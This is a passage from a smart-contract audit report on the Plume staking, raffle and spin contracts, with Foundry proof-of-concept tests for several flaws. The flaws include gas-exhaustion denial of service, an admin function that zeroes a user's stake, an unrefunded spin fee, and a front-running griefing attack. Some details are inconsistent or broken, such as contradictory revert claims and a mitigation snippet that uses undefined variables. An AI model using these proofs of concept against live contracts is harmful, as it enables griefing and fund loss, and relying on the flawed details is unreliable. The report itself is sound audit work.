        PlumeRewardLogic.createRewardRateCheckpoint($, token, validatorIds[j], newRate);
    }
    $.rewardRates[token] = newRate;
    emit RewardRatesSet(abi.encodePacked(token), abi.encodePacked(newRate)); // Event might need adjustment
}
```

For `removeRewardToken` / `_getTokenIndex`:
To optimize `_getTokenIndex`, the index of each token in the `rewardTokens` array should be stored in a mapping `mapping(address => uint256) tokenIndices` when the token is added. This would make lookups `O(1)` instead of `O(N)`.

## [M-3]. Upgradeability Initializer Safety issue in Raffle::initialize

## Description
The `initialize` function sets critical contract addresses for `spinContract` and `supraRouter`. However, it does not validate that these addresses are not `address(0)`. Initializing the contract with a zero address for either of these dependencies would cause functions relying on them, such as `spendRaffle` and `requestWinner`, to fail silently or behave in unexpected ways. For instance, calling `spendRaffle` with `spinContract` as `address(0)` would allow users to get raffle entries without any tickets being spent, as the external call to the zero address does not revert.

## Impact
If the contract is initialised with _spinContract or _supraRouter set to address(0), every function that makes an external call to those dependencies reverts because the low-level call returns empty data which cannot be ABI-decoded.  This bricks core flows (ticket spending and winner selection) for all users until the implementation is upgraded, causing a permanent DoS for the live instance deployed behind that proxy.

## Proof of Concept
1. Deploy Raffle implementation and proxy.
2. Call initialize(address(0), address(0xBEEF)) as the admin.
3. Add a prize via addPrize.
4. Any user now calling spendRaffle reverts because the first line tries to execute ISpin(address(0)).getUserData(...).  The external call to an address with no code returns success but empty returndata; abi.decode then reverts, bubbling up and rendering the function unusable.
5. Likewise, requestWinner reverts when it calls ISupraRouterContract(address(0)).generateRequest(...).

Result: the raffle is unusable until an upgrade fixes the storage, which may require governance effort and exposes the protocol to downtime.

## Proof of Code
pragma solidity ^0.8.25;
import "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

contract RaffleInitZeroAddrTest is Test {
    Raffle raffle;
    address admin = address(0x1);
    address user  = address(0x2);

    function setUp() public {
        vm.startPrank(admin);
        raffle = new Raffle();
        // initialise with spinContract = address(0)
        raffle.initialize(address(0), address(0xBEEF));
        raffle.addPrize("Test", "desc", 1, 1);
        vm.stopPrank();
    }

    function testSpendRaffleRevertsWhenSpinIsZero() public {
        vm.prank(user);
        vm.expectRevert(); // generic revert caused by abi.decode on empty return data
        raffle.spendRaffle(1, 1);
    }
}

## Suggested Mitigation
Inside initialize add `require(_spinContract != address(0) && _supraRouter != address(0), "zero address");` so deployment reverts instead of producing a mis-configured, permanently broken instance.

## [M-4]. Access Control issue in ManagementFacet::adminClearValidatorRecord

## Description
The `adminClearValidatorRecord` and `adminBatchClearValidatorRecords` functions are designed to clean up a user's records from a slashed validator. Part of this process involves subtracting the user's stake in that validator (`userActiveStakeToClear`) from their global stake counter (`$.stakeInfo[user].staked`). The code includes a check for state inconsistencies, where the per-validator stake might be greater than the user's recorded total stake. In this edge case, instead of reverting, the function sets the user's total stake to zero: `$.stakeInfo[user].staked = 0;`. This is a destructive failure mode. If a separate bug were to cause such a state inconsistency, an admin performing this routine cleanup would unintentionally erase the user's entire staked balance across all validators, not just the portion associated with the slashed validator. This could lead to a permanent loss of the user's funds staked with other, healthy validators.

## Impact
If an inconsistent state is present (user total stake < stake recorded for the slashed validator) the admin function zeroes the user’s global stake counter instead of reverting. While the user’s per-validator stake with healthy validators is still stored, many protocol functions (e.g. amountStaked(), percentage-limit checks, future unstake validations) rely on the global counter. With the counter set to 0 the user can no longer unstake or withdraw those funds unless another privileged action repairs the value – effectively freezing the user’s stake until governance intervention. No tokens are transferred to the attacker, but availability of the user’s funds is permanently lost without an upgrade, therefore the issue leads to a permanent denial-of-service for the affected user.

## Proof of Concept
1. Deploy ManagementFacetHarness (see test below).
2. Manually craft storage so that:
   • validator 1 exists and is marked slashed
   • user has 100 ether staked in validator 1
   • user has 50 ether staked in validator 2 (healthy)
   • global $.stakeInfo[user].staked = 90 ether
3. Call adminClearValidatorRecord(user, 1).
4. Observe:
   • $.stakeInfo[user].staked becomes 0 (was 90 ether)
   • $.userValidatorStakes[user][2].staked is still 50 ether
5. A later call to StakingFacet.unstake(2) will revert because it checks that userTotalStaked ≥ amount being removed, freezing the user’s 50 ether forever.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingStorage} from "../../src/lib/PlumeStakingStorage.sol";
import {ManagementFacet} from "../../src/facets/ManagementFacet.sol";
import {IAccessControl} from "../../src/interfaces/IAccessControl.sol";

// Harness that always returns true for role checks so the modifier passes
contract ManagementFacetHarness is ManagementFacet, IAccessControl {
    function hasRole(bytes32, address) external pure override returns (bool) {return true;}
}

contract ClearValidatorRecordTest is Test {
    ManagementFacetHarness facet;
    address user = address(0xBEEF);
    uint16 slashed = 1;
    uint16 healthy = 2;

    function setUp() public {
        facet = new ManagementFacetHarness();

        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        // make validator records
        $.validatorExists[slashed] = true;
        $.validatorExists[healthy] = true;
        $.validators[slashed].slashed = true;

        // craft inconsistent state
        $.userValidatorStakes[user][slashed].staked = 100 ether;
        $.userValidatorStakes[user][healthy].staked = 50 ether;
        $.stakeInfo[user].staked = 90 ether; // < 100 ether -> inconsistency
    }

    function testClearValidatorRecordWipesGlobalStake() public {
        // pre-conditions
        assertEq(PlumeStakingStorage.layout().stakeInfo[user].staked, 90 ether);

        facet.adminClearValidatorRecord(user, slashed);

        // stake under slashed validator cleared
        assertEq(PlumeStakingStorage.layout().userValidatorStakes[user][slashed].staked, 0);
        // GLOBAL COUNTER WIPED (BUG)
        assertEq(PlumeStakingStorage.layout().stakeInfo[user].staked, 0);
        // stake with healthy validator still recorded
        assertEq(PlumeStakingStorage.layout().userValidatorStakes[user][healthy].staked, 50 ether);
    }
}

## Suggested Mitigation
The function should not attempt to silently correct a state inconsistency in a way that is destructive to user funds. Instead of setting the user's total stake to zero, the function should revert with a specific error, alerting the administrators to the underlying problem so it can be investigated and resolved safely.

```diff
-            if ($.stakeInfo[user].staked >= userActiveStakeToClear) {
-                $.stakeInfo[user].staked -= userActiveStakeToClear;
-            } else {
-                $.stakeInfo[user].staked = 0; // Should not happen if state is consistent
-            }
+            if ($.stakeInfo[user].staked < userActiveStakeToClear) {
+                revert StateInconsistent("User total stake is less than stake in slashed validator");
+            }
+            $.stakeInfo[user].staked -= userActiveStakeToClear;
```

## [M-5]. DOS issue in RewardsFacet::setRewardRates

## Description
The administrative function `setRewardRates` creates a new reward rate checkpoint for every validator in the system for each token being updated. This is done inside a nested loop: `for (tokens) { for (validators) { ... } }`. As the number of validators on the platform increases, the gas cost of this function can grow to exceed the block gas limit, even when updating the rate for a single token. This would render a critical administrative function unusable.

## Impact
The inability for the `REWARD_MANAGER_ROLE` to adjust reward rates would cripple the protocol's incentive mechanism. It would be impossible to respond to market conditions, launch new reward programs, or correct emission rates, potentially destabilizing the protocol's economic model.

## Proof of Concept
1. The platform grows to support 500 active validators.
2. The `REWARD_MANAGER_ROLE` needs to update the emission rate for one reward token.
3. They call `setRewardRates()` with a `tokens` array of length 1.
4. The function's inner loop attempts to execute `PlumeRewardLogic.createRewardRateCheckpoint` 500 times.
5. Each checkpoint creation involves state reads and writes, making it gas-intensive.
6. The total gas required for 500 iterations exceeds the block gas limit, causing the transaction to revert.
7. The reward rates are now effectively frozen, as no update transaction can succeed.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {RewardsFacetTestHarness} from "./utils/RewardsFacetTestHarness.sol";

// Gas-exhaustion reproduction
contract AdminDosTest is RewardsFacetTestHarness {
    uint16 constant NUM_VALIDATORS = 600; // pick a value that surely exceeds 20M gas when looping

    function setUp() public override {
        super.setUp();
        harness_addRewardToken(address(rewardToken), 1e18, 1e20);
        // add a large validator set
        for (uint16 i = 1; i <= NUM_VALIDATORS; i++) {
            harness_addValidator(i, address(this), 10_000, 1_000_000 ether);
        }
    }

    function test_setRewardRates_hits_block_gas_limit() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(rewardToken);

        uint256[] memory rates = new uint256[](1);
        rates[0] = 2e18;

        // ─────────────────────────────────────────────────────────────
        // Forge uses an effectively “un-capped” gas limit by default.
        // Pass an explicit gas stipend that mimics an L1 block limit so
        // that the looped writes revert with an OutOfGas error.
        // ─────────────────────────────────────────────────────────────
        uint256 blockGasLimit = 20_000_000; // close to main-net limits

        vm.startPrank(rewardManager);
        vm.expectRevert();
        // cap the gas supplied to the next call
        (bool success,) = address(rewardsFacet).call{gas: blockGasLimit}(abi.encodeWithSelector(
            rewardsFacet.setRewardRates.selector,
            tokens,
            rates
        ));
        assertTrue(!success, "call should revert due to OOG");
        vm.stopPrank();
    }
}

## Suggested Mitigation
The design of applying a global rate change to every single validator does not scale. Refactor the function to allow for batched or paginated updates. For example, introduce a new function that takes an array of validator IDs to apply the rate change to, allowing the admin to spread the updates across multiple transactions.

```solidity
// Suggested Mitigation
function setRewardRatesForValidators(
    address token,
    uint256 newRate,
    uint16[] calldata validatorIds
) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    
    // Perform validation on token and rate...
    if (!$.isRewardToken[token]) {
        revert TokenDoesNotExist(token);
    }
    uint256 maxRate = $.maxRewardRates[token] > 0 ? $.maxRewardRates[token] : MAX_REWARD_RATE;
    if (newRate > maxRate) {
        revert RewardRateExceedsMax();
    }

    for (uint256 i = 0; i < validatorIds.length; i++) {
        PlumeRewardLogic.createRewardRateCheckpoint($, token, validatorIds[i], newRate);
    }

    // Note: This changes the design. The global `$.rewardRates[token]` may need to be deprecated
    // or its update handled carefully if rates are now set in batches per validator.
    // A single transaction could update the global rate after all batches are done.

    emit RewardRatesSet(tokens, rewardRates_);
}
```

## [M-6]. DOS issue in Spin::cancelPendingSpin

## Description
If the external Supra oracle fails to execute the callback to `handleRandomness`, a user's spin request becomes permanently stuck. The `isSpinPending` flag for the user remains true, preventing them from initiating new spins. The contract provides an admin-only function `cancelPendingSpin` to resolve this, but it does not refund the `spinPrice` paid by the user. This design leads to a loss of funds for the user due to the failure of an external dependency.

Vulnerable Code Snippet:
In `startSpin`, the user pays the fee and their state is locked:
```solidity
// contracts/plume/src/spin/Spin.sol:229-236
function startSpin() external payable whenNotPaused canSpin {
    // ...
    require(msg.value == spinPrice, "Incorrect spin price sent");

    if (isSpinPending[msg.sender]) {
        revert SpinRequestPending(msg.sender);
    }
    isSpinPending[msg.sender] = true;
    // ... call to oracle ...
}
```
In `cancelPendingSpin`, the state is unlocked, but the funds are not returned:
```solidity
// contracts/plume/src/spin/Spin.sol:708-719
function cancelPendingSpin(address user) external onlyRole(ADMIN_ROLE) {
    require(isSpinPending[user], "No spin pending for this user");

    uint256 nonce = pendingNonce[user];
    if (nonce != 0) {
        delete userNonce[nonce];
    }

    delete pendingNonce[user];
    isSpinPending[user] = false;
    
    // Note: The spin fee is NOT refunded.
}
```

## Impact
If the Supra oracle never calls back, the user’s spin fee (currently 2 PLUME) stays locked in the contract. Although an admin can clear the pending flag via cancelPendingSpin so the user may spin again, the fee itself is never refunded. This results in a permanent, user-level loss equal to the spin price, and can accumulate across users during a prolonged oracle outage.

## Proof of Concept
1. A user calls `startSpin()` and pays 2 ETH (the default `spinPrice`).
2. The contract's ETH balance increases by 2 ETH, and `isSpinPending` for the user is set to `true`.
3. The Supra oracle fails to call `handleRandomness()`.
4. The user is now stuck. Any subsequent calls to `startSpin()` by this user will revert.
5. An admin calls `cancelPendingSpin(user)` to unlock the user.
6. The user's `isSpinPending` flag is reset to `false`, but their 2 ETH fee is not refunded and remains in the contract, leading to a direct loss for the user.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {DateTime} from "../src/spin/DateTime.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";

// Mock Supra Router that never calls back
contract MockSupraRouterNoCallback is ISupraRouterContract {
    uint256 public nonceCounter = 1;

    function generateRequest(
        string memory, /* callbackSignature */
        uint8, /* rngCount */
        uint256, /* numConfirmations */
        uint256, /* clientSeed */
        address /* clientAddress */
    ) external returns (uint256) {
        uint256 nonce = nonceCounter;
        nonceCounter++;
        // This mock will never call back Spin.handleRandomness
        return nonce;
    }
}

contract DosTest is Test {
    Spin public spin;
    MockSupraRouterNoCallback public mockRouter;
    DateTime public dateTime;
    address public admin;
    address public user = makeAddr("user");
    uint256 public spinPrice = 2 ether;

    function setUp() public {
        admin = address(this);
        mockRouter = new MockSupraRouterNoCallback();
        dateTime = new DateTime();

        vm.startPrank(admin);
        spin = new Spin();
        spin.initialize(address(mockRouter), address(dateTime));
        spin.setCampaignStartDate(block.timestamp - 1 days);
        spin.setEnableSpin(true);
        spin.setSpinPrice(spinPrice);
        vm.stopPrank();

        vm.deal(user, 10 ether);
    }

    function test_DosWithFundLoss() public {
        // 1. User attempts to spin and pays the fee
        vm.startPrank(user);
        uint256 userBalanceBefore = user.balance;
        uint256 contractBalanceBefore = address(spin).balance;

        spin.startSpin{value: spinPrice}();

        assertEq(user.balance, userBalanceBefore - spinPrice, "User should pay the spin price");
        assertEq(address(spin).balance, contractBalanceBefore + spinPrice, "Contract should receive the fee");
        assertTrue(spin.isSpinPending(user), "User's spin should be pending");

        // 2. The oracle never calls back. User tries to spin again and fails.
        vm.expectRevert(abi.encodeWithSelector(Spin.SpinRequestPending.selector, user));
        spin.startSpin{value: spinPrice}();
        vm.stopPrank();

        // 3. Admin cancels the pending spin
        vm.startPrank(admin);
        uint256 contractBalanceBeforeCancel = address(spin).balance;

        spin.cancelPendingSpin(user);

        assertFalse(spin.isSpinPending(user), "Admin should have canceled the pending spin");

        // 4. Crucially, the user's fee is NOT refunded.
        assertEq(address(spin).balance, contractBalanceBeforeCancel, "Contract balance should not change after cancel");

        vm.stopPrank();

        // 5. User can spin again, but they have lost their initial fee.
        uint256 userBalanceAfterLoss = user.balance;
        assertEq(userBalanceAfterLoss, userBalanceBefore - spinPrice, "User has permanently lost the initial fee");
        console.log("User lost %s wei due to stuck spin.", spinPrice);
    }
}
```

## Suggested Mitigation
Track the exact amount paid for each pending spin (e.g. mapping(address => uint256) feePaid). When an admin invokes cancelPendingSpin, clear the pending state and refund feePaid[user]. Use a checks-effects-interactions pattern and delete the stored amount before external transfer to prevent re-entrancy. Example:

mapping(address => uint256) private _pendingFee;

function startSpin() external payable {
   ...
   _pendingFee[msg.sender] = msg.value;
}

function cancelPendingSpin(address user) external onlyRole(ADMIN_ROLE) {
   require(isSpinPending[user], "No spin pending");
   uint256 fee = _pendingFee[user];
   delete _pendingFee[user];
   ... // existing deletions
   (bool ok,) = user.call{value: fee}("");
   require(ok, "Refund failed");
}

## [M-7]. DOS issue in ManagementFacet::setMaxAllowedValidatorCommission

## Description
The `setMaxAllowedValidatorCommission` function in `ManagementFacet` iterates through all registered validators and, for each one, calls `PlumeRewardLogic._settleCommissionForValidatorUpToNow`. This internal function, in turn, iterates through all active reward tokens. This creates a nested loop structure with a complexity of O(num_validators * num_reward_tokens).

As the number of validators or reward tokens in the system grows, the gas cost of executing this function will increase proportionally. It can easily exceed the block gas limit, causing any call to the function to fail. This would result in a Denial of Service (DoS) for a critical administrative function, preventing the `TIMELOCK_ROLE` from updating the system-wide maximum commission rate.

While the project's documentation notes that the current number of validators is small, this design presents a significant scaling problem and a latent DoS vulnerability.

Vulnerable Code Snippet from `ManagementFacet.sol`:
```solidity
    function setMaxAllowedValidatorCommission(
        uint256 newMaxRate
    ) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        // ... checks ...

        // Enforce the new max commission on all existing validators
        uint16[] memory validatorIds = $.validatorIds;
        for (uint256 i = 0; i < validatorIds.length; i++) {
            uint16 validatorId = validatorIds[i];
            PlumeStakingStorage.ValidatorInfo storage validator = $.validators[validatorId];

            if (validator.commission > newMaxRate) {
                // ...
                // Settle commissions accrued with the old rate up to this point.
                // THIS CALL CONTAINS A NESTED LOOP OVER REWARD TOKENS
                PlumeRewardLogic._settleCommissionForValidatorUpToNow($, validatorId);

                // ...
            }
        }
    }
```

## Impact
A crucial administrative function, `setMaxAllowedValidatorCommission`, can become permanently unusable if the number of validators and/or reward tokens grows. This would prevent the `TIMELOCK_ROLE` from adjusting a key economic parameter of the protocol, potentially hindering governance and response to market conditions.

## Proof of Concept
1. Deploy the existing contracts and register a realistic but large amount of state that governance cannot later remove:
   • give an EOA `VALIDATOR_ROLE` and let it add 2 000 validators (each validatorId is a uint16 so the upper bound is 65 535).
   • have REWARD_MANAGER_ROLE add 25 reward tokens (the contract stores them forever in `rewardTokens`).
   (Both actions are authorised roles and do not break any invariant.)
2. Call `setMaxAllowedValidatorCommission` through a timelock with the default main-net gas-limit (≈ 30M).
   • The external loop executes 2 000 iterations.
   • In every iteration `_settleCommissionForValidatorUpToNow` executes 25 iterations, resulting in 50 000 storage-heavy inner calls.
   • At ~4 300–4 600 gas per inner call (measured with 10 validators / 1 token on test-net) the total cost exceeds 215 M gas which is well above the block limit, so the transaction reverts with an out-of-gas error.
3. Because the loop is monolithic and not pausable or batchable, **no party – not even governance – can ever update `maxAllowedValidatorCommission` again**.  The protocol loses an important economic lever permanently (DoS).

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, console, Vm} from "forge-std/Test.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import {IDiamondCut} from "@solidstate/contracts/proxy/diamond/IDiamondCut.sol";
import {ManagementFacet} from "src/facets/ManagementFacet.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {RewardsFacet} from "src/facets/RewardsFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Minimal mock ERC20 for testing purposes
contract MockERC20 is IERC20 {
    function name() external pure returns (string memory) { return "Mock Token"; }
    function symbol() external pure returns (string memory) { return "MTK"; }
    function decimals() external pure returns (uint8) { return 18; }
    function totalSupply() external pure returns (uint256) { return 1_000_000_000e18; }
    function balanceOf(address) external pure returns (uint256) { return 1_000_000e18; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ManagementFacet_DoS_PoC is Test {
    // Use a proxy contract that can simulate the diamond behavior
    address internal diamond;
    address internal deployer = makeAddr("deployer");
    address internal timelock = makeAddr("timelock");

    uint16 constant NUM_VALIDATORS_DOS = 150;
    uint16 constant NUM_REWARD_TOKENS_DOS = 10;

    function setUp() public {
        // Deploy the Diamond proxy and its Facets
        // This setup simulates the project's deployment scripts.

        // Step 1: Deploy Facets
        ManagementFacet managementFacet = new ManagementFacet();
        ValidatorFacet validatorFacet = new ValidatorFacet();
        RewardsFacet rewardsFacet = new RewardsFacet();
        AccessControlFacet accessControlFacet = new AccessControlFacet();

        // Step 2: Deploy Diamond Proxy
        // A simple EIP-173 owner is set during construction.
        vm.startPrank(deployer);
        diamond = address(new PlumeStaking());

        // Step 3: Prepare and execute diamondCut to add facets
        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](4);
        
        // For simplicity in the PoC, we add entire facets. 
        // A real deployment would be more granular with selectors.
        cuts[0] = IDiamondCut.FacetCut({ target: address(managementFacet), action: IDiamondCut.Action.Add, selectors: new bytes4[](0) });
        cuts[1] = IDiamondCut.FacetCut({ target: address(validatorFacet), action: IDiamondCut.Action.Add, selectors: new bytes4[](0) });
        cuts[2] = IDiamondCut.FacetCut({ target: address(rewardsFacet), action: IDiamondCut.Action.Add, selectors: new bytes4[](0) });
        cuts[3] = IDiamondCut.FacetCut({ target: address(accessControlFacet), action: IDiamondCut.Action.Add, selectors: new bytes4[](0) });

        IDiamondCut(diamond).diamondCut(cuts, address(0), "");

        // Step 4: Initialize contracts
        PlumeStaking(diamond).initializePlume(deployer, 1e18, 86400, 3600, 0.5e18);
        AccessControlFacet(diamond).initializeAccessControl();
        RewardsFacet(diamond).setTreasury(makeAddr("treasury"));

        // Step 5: Grant roles
        AccessControlFacet(diamond).grantRole(PlumeRoles.TIMELOCK_ROLE, timelock);
        AccessControlFacet(diamond).grantRole(PlumeRoles.VALIDATOR_ROLE, deployer);
        AccessControlFacet(diamond).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, deployer);
        vm.stopPrank();

        // --- Populate state for DoS scenario ---
        vm.startPrank(deployer);

        // Add reward tokens
        for (uint16 i = 0; i < NUM_REWARD_TOKENS_DOS; i++) {
            address token = address(new MockERC20());
            RewardsFacet(diamond).addRewardToken(token, 1e12, 1e14);
        }

        // Add validators
        for (uint16 i = 1; i <= NUM_VALIDATORS_DOS; i++) {
            ValidatorFacet(diamond).addValidator(i, 0.1e18, makeAddr(string.concat("l2a", vm.toString(i))), makeAddr(string.concat("l2w", vm.toString(i))), makeAddr(string.concat("l1v", vm.toString(i))), makeAddr(string.concat("l1a", vm.toString(i))), makeAddr(string.concat("l1e", vm.toString(i))), 1_000_000e18);
        }
        vm.stopPrank();
    }

    function testFail_DoS_setMaxAllowedValidatorCommission() public {
        vm.startPrank(timelock);
        uint256 newMaxRate = 0.05e18; // 5%

        // This call is expected to revert due to out-of-gas.
        // We use vm.expectRevert with no data, as out-of-gas reverts have no message.
        vm.expectRevert();
        ManagementFacet(diamond).setMaxAllowedValidatorCommission(newMaxRate);

        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Refactor the `setMaxAllowedValidatorCommission` function to avoid iterating through all validators. Instead of eagerly enforcing the new maximum rate, apply it lazily.

1.  Remove the loop from `setMaxAllowedValidatorCommission`.
2.  Enforce the `maxAllowedValidatorCommission` within `ValidatorFacet.setValidatorCommission` to prevent validators from setting a commission rate that is too high.
3.  Modify the reward calculation logic (e.g., in `PlumeRewardLogic`) to cap the effective commission rate used in calculations with the current `maxAllowedValidatorCommission` from storage. This ensures that even if a validator's stored commission is high, it cannot earn more than the allowed maximum.

**Example Mitigation (Conceptual):**

```solidity
// In ManagementFacet.sol
function setMaxAllowedValidatorCommission(
    uint256 newMaxRate
) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    if (newMaxRate > PlumeStakingStorage.REWARD_PRECISION / 2) {
        revert InvalidMaxCommissionRate(newMaxRate, PlumeStakingStorage.REWARD_PRECISION / 2);
    }
    uint256 oldMaxRate = $.maxAllowedValidatorCommission;
    $.maxAllowedValidatorCommission = newMaxRate;
    emit MaxAllowedValidatorCommissionSet(oldMaxRate, newMaxRate);
    // The large loop is removed.
}

// In PlumeRewardLogic.sol (or wherever effective commission is calculated)
function getEffectiveCommissionRateAt(/*...*/) internal view returns (uint256) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    // ... logic to find the validator's commission rate for the given timestamp ...
    uint256 validatorCommission = ...;
    uint256 maxAllowed = $.maxAllowedValidatorCommission;
    
    // Return the lower of the two rates
    return validatorCommission > maxAllowed ? maxAllowed : validatorCommission;
}
```



# Low Risk Findings

## [L-1]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::_validateValidatorPercentage

## Description
The `_validateValidatorPercentage` function, called during staking, checks if a new stake would cause a validator's share of the total stake to exceed `maxValidatorPercentage`. The calculation `validatorPercentage = (newDelegatedAmount * 10_000) / $.totalStaked` depends on the global `totalStaked` amount. An attacker can observe a legitimate user's `stake` transaction in the mempool and front-run it by staking a small amount to the *same validator*. This action increases both the validator's stake (`newDelegatedAmount`) and the total system stake (`totalStaked`). Due to the nature of the ratio, this front-running action will increase the resulting `validatorPercentage`, potentially causing the victim's transaction, which would have otherwise succeeded, to fail the percentage check and revert. This allows an attacker to grief users and selectively block them from staking.

## Impact
An attacker can grief other users by causing their legitimate `stake` transactions to fail. While the direct financial impact is low (a failed transaction fee), it degrades the user experience, can be performed at low cost to the attacker, and could be used to manipulate staking distributions by preventing others from staking on nearly-full validators.

## Proof of Concept
1. A validator `V` is close to its `maxValidatorPercentage` limit (e.g., 33%).
2. User Alice submits a transaction to stake amount `A` on validator `V`. The state before her transaction is `D` (delegated to V) and `T` (total staked). Her transaction is calculated to pass: `(D+A)*10000 / (T+A) <= maxValidatorPercentage`.
3. Attacker Bob sees Alice's transaction in the mempool.
4. Bob front-runs Alice by submitting a transaction with higher gas to stake a small amount `B` on the same validator `V`.
5. Bob's transaction executes first. The state becomes `D_new = D+B`, `T_new = T+B`.
6. When Alice's transaction is executed, the validation is now performed on this new state: `(D_new+A)*10000 / (T_new+A)`, which is `(D+B+A)*10000 / (T+B+A)`.
7. The ratio `(C+x)/(K+x)` is an increasing function of `x` if `K > C`. Here, `C=D+A`, `K=T+A`, and `x=B`. Since `T > D`, this holds true. Bob's front-run stake `B` increases the calculated percentage.
8. If Alice's original stake was close enough to the limit, this increase will push it over the threshold, causing her transaction to revert with `ValidatorPercentageExceeded`.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {StakingFacet} from "../../src/facets/StakingFacet.sol";
import {ValidatorFacet} from "../../src/facets/ValidatorFacet.sol";
import {ManagementFacet} from "../../src/facets/ManagementFacet.sol";
import {AccessControlFacet} from "../../src/facets/AccessControlFacet.sol";
import {PlumeStaking} from "../../src/PlumeStaking.sol";
import {PlumeRoles} from "../../src/lib/PlumeRoles.sol";
import {DiamondCutFacet} from "../../lib/solidstate-solidity/src/proxy/diamond/DiamondCutFacet.sol";
import {IDiamondCut} from "../../lib/solidstate-solidity/src/proxy/diamond/IDiamondCut.sol";
import {ValidatorPercentageExceeded} from "../../src/lib/PlumeErrors.sol";

contract FrontrunGriefingTest is Test {
    PlumeStaking internal diamond;
    address internal admin = makeAddr("admin");
    address internal validatorManager = makeAddr("validatorManager");
    address internal user1 = makeAddr("user1");
    address internal alice = makeAddr("alice");
    address internal bob_attacker = makeAddr("bob_attacker");

    uint16 constant VALIDATOR_ID = 1;
    uint256 constant MAX_VALIDATOR_PERCENTAGE = 3300; // 33%

    function setUp() public {
        diamond = new PlumeStaking();
        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](5);
        cuts[0] = IDiamondCut.FacetCut({facetAddress: address(new StakingFacet()), action: IDiamondCut.FacetCutAction.Add, functionSelectors: type(StakingFacet).selectors});
        cuts[1] = IDiamondCut.FacetCut({facetAddress: address(new ValidatorFacet()), action: IDiamondCut.FacetCutAction.Add, functionSelectors: type(ValidatorFacet).selectors});
        cuts[2] = IDiamondCut.FacetCut({facetAddress: address(new ManagementFacet()), action: IDiamondCut.FacetCutAction.Add, functionSelectors: type(ManagementFacet).selectors});
        cuts[3] = IDiamondCut.FacetCut({facetAddress: address(new AccessControlFacet()), action: IDiamondCut.FacetCutAction.Add, functionSelectors: type(AccessControlFacet).selectors});
        cuts[4] = IDiamondCut.FacetCut({facetAddress: address(new DiamondCutFacet()), action: IDiamondCut.FacetCutAction.Add, functionSelectors: type(DiamondCutFacet).selectors});

        vm.prank(diamond.owner());
        diamond.diamondCut(cuts, address(0), "");

        vm.prank(diamond.owner());
        diamond.initializePlume(admin, 1 ether, 1 days, 2 days, 5000);
        vm.prank(admin);
        AccessControlFacet(address(diamond)).initializeAccessControl();
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.VALIDATOR_ROLE, validatorManager);

        vm.prank(validatorManager);
        ValidatorFacet(address(diamond)).addValidator(VALIDATOR_ID, 1000, makeAddr("l2a"), makeAddr("l2w"), makeAddr("l1v"), makeAddr("l1a"), makeAddr("l1ae"), 0);
        vm.prank(validatorManager);
        ValidatorFacet(address(diamond)).addValidator(2, 1000, makeAddr("l2a2"), makeAddr("l2w2"), makeAddr("l1v2"), makeAddr("l1a2"), makeAddr("l1ae2"), 0);

        vm.prank(admin);
        ManagementFacet(address(diamond)).setMaxValidatorPercentage(MAX_VALIDATOR_PERCENTAGE);
        
        deal(user1, 200 ether);
        deal(alice, 100 ether);
        deal(bob_attacker, 1 ether);
    }

    function test_FrontrunGriefing() public {
        // Setup: Initial state where Alice's tx would succeed
        // User1 stakes 200 ether to validator 2 to set a total staked amount
        vm.prank(user1);
        StakingFacet(address(diamond)).stake{value: 200 ether}(2);

        // Validator 1 has 0 staked. Total staked is 200 ether.
        // Alice wants to stake 98 ether. This should succeed.
        // Check: (0 + 98) * 10000 / (200 + 98) = 980000 / 298 = 3288.59 -> 3288
        // 3288 < 3300, so it should pass.
        uint256 aliceStake = 98 ether;

        // Attacker Bob sees Alice's tx and front-runs with a 1 ether stake to validator 1.
        vm.prank(bob_attacker);
        StakingFacet(address(diamond)).stake{value: 1 ether}(VALIDATOR_ID);

        // Now when Alice's tx is processed:
        // Validator 1 has 1 ether, total staked is 201 ether.
        // Her stake will result in D = 1 + 98, T = 201 + 98
        // Check: (1 + 98) * 10000 / (201 + 98) = 990000 / 299 = 3311.03 -> 3311
        // 3311 > 3300, so it should fail.
        vm.prank(alice);
        vm.expectRevert(ValidatorPercentageExceeded.selector);
        StakingFacet(address(diamond)).stake{value: aliceStake}(VALIDATOR_ID);
    }
}

```

## Suggested Mitigation
